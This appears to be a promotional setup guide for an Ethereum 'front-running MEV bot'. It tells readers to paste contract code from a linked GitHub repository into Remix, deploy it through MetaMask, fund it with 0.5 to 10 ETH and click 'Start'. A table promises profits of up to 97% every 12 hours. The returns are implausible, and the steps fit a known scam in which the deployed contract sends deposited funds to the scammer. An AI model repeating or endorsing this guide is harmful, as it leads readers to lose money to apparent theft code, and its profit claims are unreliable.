🚨 Important Notice: Ensure Sufficient Funding for Gas and Burn Fees 🚨

Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover both gas and potential burn fees is essential for smooth operation. The bot is configured to target token contracts with a maximum burn fee of 10%, though most tokens today fall within a 2%-6% fee range. Funding with less than 0.5 ETH could result in wasted gas on failed transactions if the bot encounters higher burn fees.

To avoid this, I recommend funding your contract with at least 0.5 ETH and up to 10 ETH to ensure the bot functions optimally.

Step-by-Step Setup Guide:

1- Download MetaMask

► [Install MetaMask](https://metamask.io/download/)

2- Access Remix

► [Use Remix Ethereum IDE](https://remix.ethereum.org/) 🚨 https://remix.ethereum.org/ 🚨 (Ensure you only use this version, as the bot is compatible with it specifically.)

3- Create Contract File

► Go to the “contracts” folder and create a “New File”.

► Rename it to a desired name ending in .sol, for example, “bot.sol.”

► If text colors are missing when creating the file, refresh the browser and paste in the code again.

4- Paste Code in Remix

► Copy and paste the bot code: [ETH Bot Code.
](https://github.com/JCBury/ETH-BOT/blob/main/Bot.sol)

5- Compile the Contract

► Go to the “Compile” tab on Remix.

► Select Solidity version 0.6.6 for compilation.

7- Deploy the Contract

► In the “Deploy & Run Transactions” tab, set “Injected Provider - MetaMask” as the environment and click “Deploy.”

► Confirm the contract creation in MetaMask.
Note: Ensure your contract name is correctly selected in the CONTRACT section before clicking Deploy. Example: “OneinchSlippageBot - bot.sol.”

Troubleshooting: If you receive a "Gas estimation failed" error after clicking deploy, select "Send transaction" and confirm. MetaMask will automatically estimate the gas fee.
Or you can make the change manually.

7- Fund Your Bot

► Deposit at least 0.5 ETH to cover slippage and ensure effective front-running.

► Transfer the funds to your specific bot address.

8-Run the Bot

► After confirmation, click "Start" to initiate the bot.

► Withdraw your profits anytime by clicking "Withdraw".

Following these steps will help ensure a successful bot operation with minimized transaction issues.
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖

📈 Estimated Profits

<table><thead><tr><th style="text-align: center;"><strong>Investment Range (ETH)</strong></th><th style="text-align: center;"><strong>Liquidity Level</strong></th><th style="text-align: center;"><strong>Profits per 12 Hours</strong></th></tr></thead><tbody><tr><td>0.5 ETH - 1 ETH</td><td>Moderate</td><td>Up to 20%</td></tr><tr><td>1 ETH - 3 ETH</td><td>High</td><td>27-35%</td></tr><tr><td>2 ETH - 5 ETH</td><td>High</td><td>35-50%</td></tr><tr><td>6 ETH - 10 ETH</td><td>Very High</td><td>50-63%</td></tr><tr><td>10 ETH - 20 ETH</td><td>Very High</td><td>76%+</td></tr><tr><td>20 ETH - 50 ETH</td><td>Extremely High</td><td>97%+</td></tr></tbody></table>

🔥 My running mev bot, used 10 ETH. Averaging about 1-3 ETH per day!
https://etherscan.io/address/0x4838b106fce9647bdf1e7877bf73ce8b0bad5f97

Happy trading! 🚀
